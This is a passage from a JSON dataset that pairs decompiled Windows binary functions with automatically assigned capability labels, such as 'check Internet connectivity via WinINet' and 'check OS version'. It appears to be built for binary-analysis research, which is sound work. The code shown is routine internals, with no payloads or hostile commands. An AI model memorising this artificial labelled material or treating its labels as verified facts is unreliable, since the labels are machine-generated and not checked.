        "decompiled_code": "\nuint64_t fcn.00055960(int64_t arg1, ulong arg2, uint32_t *arg3)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    \n    uVar7 = 0;\n    uVar4 = 0;\n    uVar3 = 0;\n    if (arg2 << 3 != 0) {\n        uVar9 = 0;\n        puVar8 = arg3;\n        do {\n            uVar2 = uVar3 & 7;\n            uVar4 = uVar4 | ((*((uVar9 >> 3) + arg1) & 1 << uVar2) >> uVar2) << uVar3 % 0x1c;\n            if (uVar3 % 0x1c == 0x1b) {\n                iVar6 = uVar7;\n                uVar7 = iVar6 + 1;\n                *puVar8 = iVar6 << 0x1c | uVar4;\n                puVar8 = puVar8 + 1;\n                uVar4 = 0;\n            }\n            uVar3 = uVar3 + 1;\n            uVar9 = uVar9 + 1;\n        } while (uVar3 < arg2 << 3);\n    }\n    uVar5 = uVar3 % 0x1c;\n    if (uVar5 != 0x1b) {\n        do {\n            uVar1 = fcn.00061a9e();\n            if ((uVar1 & 1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f) == 1) {\n                uVar4 = uVar4 | 1 << uVar5;\n            }\n            uVar3 = uVar3 + 1;\n            uVar5 = uVar3 % 0x1c;\n        } while (uVar5 != 0x1b);\n        arg3[uVar7] = uVar7 << 0x1c | uVar4;\n        uVar7 = uVar7 + 1;\n    }\n    return uVar7;\n}\n",
        "token_count": 520
    },
    "00055a5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055a5c(int64_t arg1, ulong arg2, uint32_t *arg3, ulong *arg4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    ushort *puVar11;\n    uint64_t uVar12;\n    uint *in_stack_00000028;\n    uint uStack104;\n    uint8_t uStack100;\n    uchar auStack99 [35];\n    \n    iVar2 = arg2;\n    if ((((iVar2 - 0xcU < 0x1f5) && (-1 < *(arg1 + 2))) && ((*(arg1 + 2) & 0x78) == 0)) &&\n       ((iVar3 = fcn.0002fd20(),  iVar3 == 1 && (iVar2 != 0xc)))) {\n        uVar6 = *(arg1 + 0xc);\n        if (uVar6 == 0) {\n            return 0;\n        }\n        uVar10 = uVar6;\n        if ((in_stack_00000028 == NULL) || (uVar6 != 10)) {\n            if (uVar6 < 8) {\n                return 0;\n            }\n            if (0x2d < uVar10) {\n                return 0;\n            }\n        }\n        else {\n            iVar5 = fcn.00031aac(arg1 + 0xd, arg2);\n            if (iVar5 != 0) {\n                *in_stack_00000028 = 1;\n                *arg4 = *(arg1 + 0xd);\n                *(arg4 + 1) = *(arg1 + 0x15);\n                *(arg4 + 10) = 0;\n                return 1;\n            }\n        }\n        if (uVar10 < iVar2 - 0xdU) {\n            uVar7 = 0;\n            if (uVar10 != 0) {\n                puVar9 = arg1 + 0xd;\n                do {\n                    if (((((uVar7 == 8) || (uVar7 == 0xd)) || (uVar7 == 0x12)) || (uVar7 == 0x17)) &&\n                       (uVar7 < uVar6 - 1)) {\n                        if (*puVar9 != 0x2d) {\n                            return 0;\n                        }\n                    }\n                    else {\n                        uVar1 = *puVar9;\n                        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                            if (uVar1 < 0x61) {\n                                return 0;\n                            }\n                            if (0x7a < uVar1) {\n                                return 0;\n                            }\n                        }\n                    }\n                    uVar7 = uVar7 + 1;\n                    puVar9 = puVar9 + 1;\n                } while (uVar7 < uVar10);\n            }\n            puVar11 = arg1 + 0xd + uVar6;\n            for (uVar10 = (iVar2 - 0xdU) - uVar10; uVar10 != 0; uVar10 = uVar10 - uVar6) {\n                uVar6 = *puVar11;\n                uVar10 = uVar10 - 1;\n                puVar11 = puVar11 + 1;\n                if (uVar10 <= uVar6) {\n                    return 0;\n                }\n                if (uVar6 == 0) break;\n                puVar11 = puVar11 + uVar6;\n            }\n            if (3 < uVar10) {\n                iVar3 = fcn.0002fd20(*puVar11);\n                iVar4 = fcn.0002fd20(puVar11[1]);\n                if (((iVar3 == 1) && (iVar4 == 1)) &&\n                   (uVar10 = fcn.0005588c(arg1 + 0xd, *(arg1 + 0xc), &uStack104),  4 < uVar10)) {\n                    if (uVar10 != 0) {\n                        puVar8 = &uStack104;\n                        uVar12 = uVar10;\n                        do {\n                            *puVar8 = *puVar8 ^ uStack104._2_1_ >> 1;\n                            puVar8 = puVar8 + 1;\n                            uVar12 = uVar12 - 1;\n                        } while (uVar12 != 0);\n                    }\n                    uVar6 = 0;\n                    uStack104 = uStack104 & 0xff00ffff;\n                    if (uVar10 != 0) {\n                        puVar8 = &uStack104;\n                        uVar12 = uVar10;\n                        do {\n                            uVar6 = uVar6 + *puVar8;\n                            puVar8 = puVar8 + 1;\n                            uVar12 = uVar12 - 1;\n                        } while (uVar12 != 0);\n                    }\n                    if ((uStack104._2_1_ == uVar6) && ((uStack100 & 0x1f) < 0x1a)) {\n                        *arg3 = uStack104;\n                        *(arg3 + 1) = uStack100;\n                        if (arg4 != NULL) {\n                            fcn.000619f6(arg4, auStack99, uStack100 & 0x1f);\n                        }\n                        if (in_stack_00000028 != NULL) {\n                            *in_stack_00000028 = 0;\n                        }\n                        return 1;\n                    }\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1273
    },
    "0005631c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005631c(int64_t arg1, ulong *arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg3 == 0) {\n        fcn.0005fd0c(arg2, 0);\n        if (*(arg1 + 0x2a0) == 0) {\n            return;\n        }\n        *(arg1 + 0x2a8) = 0;\n        *(arg1 + 0x2b0) = 0;\n        return;\n    }\n    fcn.0002f23c(arg1 + 0x78);\n    if (*(arg1 + 0x2a0) == 0) {\n        iVar2 = *(arg1 + 0x298) + 1;\n        uVar3 = iVar2 >> 0x1f & 0x1f;\n        iVar2 = (iVar2 + uVar3 & 0x1f) - uVar3;\n        if (iVar2 == *(arg1 + 0x29c)) {\n            fcn.0005fd0c(arg2, 0);\n            goto code_r0x000563e9;\n        }\n        *(arg1 + 0x98 + *(arg1 + 0x298) * 0x10) = *arg2;\n        iVar1 = *0xfffff78000000320;\n        uVar3 = (**0x112f0)();\n        *(arg1 + (*(arg1 + 0x298) + 10) * 0x10) = (iVar1 * uVar3) / 10000;\n        *(arg1 + 0x298) = iVar2;\n    }\n    else {\n        *(arg1 + 0x2b0) = 0;\n    }\n    *arg2 = 0;\ncode_r0x000563e9:\n    fcn.0002f2a4(arg1 + 0x78);\n    return;\n}\n",
        "token_count": 442
    },
    "00060190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060190(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.0005fe58(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x45) || (pcVar2 = *(piVar1 + 0x11),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 254
    },
    "00056ecc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00056ecc(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *arg1_00;\n    int64_t *piVar2;\n    int64_t aiStackX8 [4];\n    \n    aiStackX8[0] = 0;\n    fcn.00031198(arg1 + 0x38);\n    arg1_00 = *(arg1 + 0x30);\n    piVar2 = NULL;\n    if (*(arg1 + 0x30) != NULL) {\n        do {\n            piVar1 = arg1_00;\n            arg1_00 = piVar1;\n            if (*(piVar1 + 1) == arg2) break;\n            arg1_00 = *piVar1;\n            piVar2 = piVar1;\n        } while (arg1_00 != NULL);\n        if (arg1_00 != NULL) {\n            if (piVar2 == NULL) {\n                *(arg1 + 0x30) = *arg1_00;\n            }\n            else {\n                *piVar2 = *arg1_00;\n            }\n            if (arg1_00[3] != 0) {\n                fcn.0005fde8(arg1_00[2], arg1_00[3]);\n            }\n            aiStackX8[0] = arg1_00[2];\n            fcn.0002fc50(arg1_00);\n        }\n    }\n    fcn.00031218(arg1 + 0x38);\n    if (aiStackX8[0] != 0) {\n        fcn.0005631c(arg1, aiStackX8, arg3);\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "0005801c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005801c(int64_t arg1, ulong arg2, ulong arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    ulong *arg1_00;\n    int64_t *piVar4;\n    ulong arg1_01;\n    int32_t iVar5;\n    uint8_t in_stack_00000028;\n    int32_t iStack136;\n    uchar auStack132 [4];\n    ulong uStack128;\n    ulong uStack120;\n    uint32_t uStack112;\n    ulong uStack104;\n    ulong *puStack96;\n    ulong uStack88;\n    \n    iVar5 = 0;\n    arg1_01 = uStack128;\n    do {\n        arg1_00 = fcn.0002fbc4(0x28);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        fcn.00061a56(arg1_00, 0, 0x28);\n        iVar1 = fcn.00056164(arg1, arg1_00 + 2, &iStack136);\n        if (iVar1 == 0) {\n            fcn.00031198(arg1 + 0x38);\n            do {\n                iVar1 = fcn.00061a9e();\n                *(arg1_00 + 1) = iVar1;\n                piVar4 = *(arg1 + 0x30);\n                if (piVar4 == NULL) break;\n                do {\n                    if (iVar1 == *(piVar4 + 1)) break;\n                    piVar4 = *piVar4;\n                } while (piVar4 != NULL);\n            } while (piVar4 != NULL);\n            *arg1_00 = *(arg1 + 0x30);\n            *(arg1 + 0x30) = arg1_00;\n            arg1_01 = arg1_00[2];\n            *arg4 = *(arg1_00 + 1);\n            fcn.00031218(arg1 + 0x38);\n            if (iStack136 == 0) {\n                iVar1 = 0;\n            }\n            else {\n                iVar1 = fcn.000600ac(arg1_01, 0);\n                if (iVar1 != 0) {\n                    fcn.00056ecc(arg1, *arg4, 0);\n                    arg1_01 = 0;\n                    *arg4 = 0;\n                }\n            }\n        }\n        else {\n            fcn.0002fc50(arg1_00);\n        }\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        while (iVar1 = fcn.00060288(arg1_01, &uStack128, auStack132, 0),  iVar1 == 0) {\n            fcn.0005fde8(arg1_01, uStack128);\n        }\n        if (iVar1 == 0x21590002) {\n            uStack120._0_4_ = *arg4;\n            uStack112 = in_stack_00000028 & 0xffffff01;\n            uStack120._4_4_ = arg2;\n            uVar2 = fcn.0002fcf4(uStack120);\n            uStack120 = CONCAT44(uStack120._4_4_, uVar2);\n            uVar3 = fcn.0002fcf4(uStack120._4_4_);\n            uStack120 = uStack120 & 0xffffffff | uVar3 << 0x20;\n            puStack96 = &uStack120;\n            uStack88 = 0xc;\n            uStack104 = arg3;\n            iVar1 = fcn.0006052c(arg1_01, &uStack104, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            fcn.00056ecc(arg1, *arg4, 0);\n            *arg4 = 0;\n        }\n        else {\n            fcn.00056ecc(arg1, *arg4, 0);\n        }\n        iVar5 = iVar5 + 1;\n        if (4 < iVar5) {\n            return iVar1;\n        }\n    } while( true );\n}\n",
        "token_count": 943
    },
    "0005832c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005832c(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    uchar auStackX8 [32];\n    \n    if (*0x87a08 != 0) {\n        fcn.0002ee20(0x879e0);\n        fcn.00031648(0x879d0, auStackX8);\n        fcn.00031624(0x879d0);\n        fcn.0002edfc(0x879e0);\n        fcn.00031088(0x879e8);\n        arg1 = *0x87a00;\n        while (arg1 != NULL) {\n            fcn.0005fd0c(arg1 + 2, 0);\n            fcn.0002f23c(arg1 + 3);\n            fcn.0002f2a4(arg1 + 3);\n            fcn.0002f214(arg1 + 3);\n            puVar1 = *arg1;\n            fcn.0002fc50(arg1);\n            arg1 = puVar1;\n        }\n        *0x87a00 = NULL;\n        fcn.00031108(0x879e8);\n        fcn.0003105c(0x879e8);\n        *0x87a08 = 0;\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "0005e5e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005e5e8(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *arg1_01;\n    int32_t iVar1;\n    \n    arg1_00 = *arg1;\n    fcn.0002f23c(0x87c18);\n    iVar1 = fcn.00058f70(arg1_00, 1);\n    if ((iVar1 == 0) || (arg1_01 = *arg1_00,  *(arg1_01 + 4) != 0)) {\n        fcn.0002f2a4(0x87c18);\n        *arg1 = NULL;\n    }\n    else {\n        *(arg1_01 + 4) = 1;\n        fcn.0002f2a4(0x87c18);\n        (**(**arg1_00 + 0x1c))(arg1_00, arg2);\n        fcn.00031198(arg1_01 + 1);\n        fcn.0002f23c(0x87c18);\n        *arg1 = NULL;\n        fcn.00058ef0(arg1_00, 1);\n        fcn.0002f2a4(0x87c18);\n        (**(**arg1_00 + 0x24))(arg1_00, arg2);\n        fcn.00031218(arg1_01 + 1);\n        fcn.0003105c(arg1_01 + 1);\n        fcn.0002fc50(arg1_01);\n    }\n    return;\n}\n",
        "token_count": 357
    },
    "000591d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000591d4(int64_t arg1, int64_t *arg2, uint32_t *arg3, uint64_t arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t arg4_00;\n    uint auStackX8 [8];\n    uint8_t in_stack_00000028;\n    \n    arg4_00 = arg4 & 0xffffffff;\n    if (*(arg1 + 0x18) == 0) {\n        if (*(arg1 + 0x1c) == 0) {\n            *arg3 = 0;\n            auStackX8[0] = 4;\n            uVar2 = fcn.0005ead0(*(arg1 + 8), arg3, auStackX8, arg4);\n            if (uVar2 == 0) {\n                uVar1 = fcn.0002fcf4(*arg3);\n                *arg3 = uVar1;\n                if (uVar1 < 0) {\n                    uVar2 = 0x2159000a;\n                }\n                else {\n                    iVar3 = fcn.0002fbc4(uVar1);\n                    *arg2 = iVar3;\n                    if (iVar3 != 0) {\n                        if (*arg3 == 0) {\n                            return uVar2 & 0xffffffff;\n                        }\n                        if ((in_stack_00000028 & 1) == 0) {\n                            arg4_00 = 60000;\n                        }\n                        uVar1 = fcn.0005ead0(*(arg1 + 8), iVar3, arg3, arg4_00);\n                        if (uVar1 == 0) {\n                            return uVar1;\n                        }\n                        fcn.0002fc50(*arg2);\n                        *arg2 = 0;\n                        *(arg1 + 0x18) = 1;\n                        fcn.0005e5e8(arg1 + 8, 0);\n                        return uVar1;\n                    }\n                    uVar2 = 0x21590004;\n                }\n                fcn.0005e5e8(arg1 + 8, 0);\n                *(arg1 + 0x18) = 1;\n            }\n        }\n        else {\n            *arg3 = 0x800;\n            iVar3 = fcn.0002fbc4(0x800);\n            *arg2 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0x21590004;\n            }\n            else {\n                uVar1 = fcn.0005ead0(*(arg1 + 8), iVar3, arg3, arg4_00);\n                uVar2 = uVar1;\n                if (uVar1 == 0) {\n                    return uVar2;\n                }\n                fcn.0002fc50(*arg2);\n                *arg2 = 0;\n            }\n            *arg3 = 0;\n        }\n    }\n    else {\n        uVar2 = 0x21590065;\n    }\n    return uVar2;\n}\n",
        "token_count": 681
    },
    "00059390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00059390(int64_t arg1, int64_t ***arg2, uint64_t arg3)\n\n{\n    int64_t ***pppiVar1;\n    uint64_t arg1_00;\n    ulong arg1_01;\n    uint32_t auStackX8 [8];\n    int64_t ***pppiStack56;\n    uint32_t *puStack48;\n    ulong uStack40;\n    \n    if (*(arg1 + 0x1c) == 0) {\n        arg1_00 = 0;\n        auStackX8[0] = 0;\n        pppiVar1 = arg2;\n        if (arg2 != NULL) {\n            do {\n                auStackX8[0] = arg1_00 + *(pppiVar1 + 2);\n                arg1_00 = auStackX8[0];\n                pppiVar1 = *pppiVar1;\n            } while (pppiVar1 != NULL);\n        }\n        auStackX8[0] = fcn.0002fcf4(arg1_00);\n        arg1_01 = *(arg1 + 8);\n        puStack48 = auStackX8;\n        uStack40 = 4;\n        pppiVar1 = &pppiStack56;\n        arg3 = arg3 & 0xffffffff;\n        pppiStack56 = arg2;\n    }\n    else {\n        arg1_01 = *(arg1 + 8);\n        pppiVar1 = arg2;\n    }\n    fcn.0005ec68(arg1_01, pppiVar1, arg3);\n    return;\n}\n",
        "token_count": 351
    },
    "000597c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000597c0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.0002fbc4(0x158);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        fcn.00061a56(iVar1, 0, 0x158);\n        fcn.0002f1ec(iVar1 + 0x118);\n        fcn.0002f1ec(iVar1 + 0x128);\n        fcn.0002ed80(iVar1 + 0x120);\n        *(iVar1 + 0x10) = *(arg1 + 0x10);\n        uVar2 = *(arg1 + 0x18);\n        *(iVar1 + 0x138) = 1;\n        *(iVar1 + 0x18) = uVar2;\n        fcn.0002f23c(arg1 + 0x118);\n        *(iVar1 + 0xf0) = *(arg1 + 0x108);\n        if (*(arg1 + 0x108) != 0) {\n            *(*(arg1 + 0x108) + 0xe8) = iVar1;\n        }\n        *(arg1 + 0x108) = iVar1;\n        if (*(arg1 + 0x100) == 0) {\n            *(arg1 + 0x100) = iVar1;\n        }\n        *(arg1 + 0x110) = *(arg1 + 0x110) + 1;\n        *(iVar1 + 0xf8) = arg1;\n        fcn.0002f2a4(arg1 + 0x118);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 405
    },
    "0005f17c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005f17c(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.0005f0c0(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x35) || (pcVar2 = *(piVar1 + 0xd),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 257
    },
    "000598ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000598ec(int64_t arg1, ulong *arg2, uint *arg3, uint64_t arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar2 = *(arg1 + 0xe0);\n    if (iVar2 == 0) {\n        if (*(arg1 + 8) == 0) {\n            fcn.0002f23c(arg1 + 0x128);\n            if (*(arg1 + 0xe0) == 0) {\n                iVar2 = 0x21590002;\n                iVar4 = 0;\n                do {\n                    fcn.0002f23c(arg1 + 0x118);\n                    if (*(arg1 + 200) != 0) {\n                        *arg2 = *(*(arg1 + 200) + 8);\n                        *arg3 = *(*(arg1 + 200) + 0x10);\n                        arg1_00 = *(arg1 + 200);\n                        *(arg1 + 0xd8) = *(arg1 + 0xd8) - *(arg1_00 + 2);\n                        iVar1 = *arg1_00;\n                        fcn.0002fc50(arg1_00);\n                        *(arg1 + 200) = iVar1;\n                        if (iVar1 == 0) {\n                            *(arg1 + 0xd0) = 0;\n                        }\n                        fcn.0002f2a4(arg1 + 0x118);\n                        iVar2 = 0;\n                        break;\n                    }\n                    if (*(arg1 + 0xe0) != 0) {\n                        iVar2 = *(arg1 + 0xe0);\n                        fcn.0002f2a4(arg1 + 0x118);\n                        break;\n                    }\n                    fcn.0002f2a4(arg1 + 0x118);\n                    if ((arg4 & 0xffffffff) == 0) break;\n                    iVar3 = fcn.0002ee4c(arg1 + 0x120, 0);\n                    if (iVar3 == 0) {\n                        fcn.0002ee4c(arg1 + 0x120, arg4 & 0xffffffff);\n                    }\n                    else {\n                        iVar4 = iVar4 + -1;\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 2);\n                fcn.0002f2a4(arg1 + 0x128);\n            }\n            else {\n                fcn.0002f2a4(arg1 + 0x128);\n                iVar2 = *(arg1 + 0xe0);\n            }\n        }\n        else {\n            iVar2 = fcn.0005f4ac(*(arg1 + 8), arg2, arg3, arg4);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 643
    },
    "000600ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000600ac(int64_t *arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.0005fe58(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x2d) || (pcVar2 = *(piVar1 + 0xb),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 247
    },
    "0005a444": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0005a444(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    \n    if (*(arg1 + 0x34) == 1) {\n        uVar1 = 0;\n    }\n    else {\n        fcn.0002f23c(arg1 + 0x38);\n        uVar1 = 0;\n        if (*(arg1 + 0x34) == 0) {\n            *(arg1 + 0x30) = 0x10;\n            *(arg1 + 0x34) = 1;\n            *(arg1 + 0x28) = arg1 + 0x14;\n        }\n        else {\n            uVar1 = -(*(arg1 + 0x34) != 1) & 0x2159012d;\n        }\n        fcn.0002f2a4(arg1 + 0x38);\n    }\n    return uVar1;\n}\n",
        "token_count": 208
    },
    "00060728": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00060728(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    ulong uVar4;\n    \n    iVar2 = 0;\n    puVar3 = 0x787a0;\n    do {\n        uVar1 = arg1 >> 0x1f;\n        if (*puVar3 == arg1) {\n            if ((arg1 == 0xffffffff) || ((arg1 ^ uVar1) - uVar1 < 0x186a1)) {\n                uVar4 = 0x16050;\n            }\n            else {\n                uVar4 = 0x16060;\n            }\n            fcn.0001fd08(arg3, arg4, uVar4, arg2);\n            return 1;\n        }\n        if ((arg1 == 0xffffffff) || (uVar4 = 0x16080,  (arg1 ^ uVar1) - uVar1 < 0x186a1)) {\n            uVar4 = 0x16070;\n        }\n        fcn.0001fd08(arg3, arg4, uVar4, arg2);\n        iVar2 = iVar2 + 1;\n        puVar3 = puVar3 + 4;\n    } while (iVar2 == 0);\n    return 0;\n}\n",
        "token_count": 309
    },
    "0005b300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
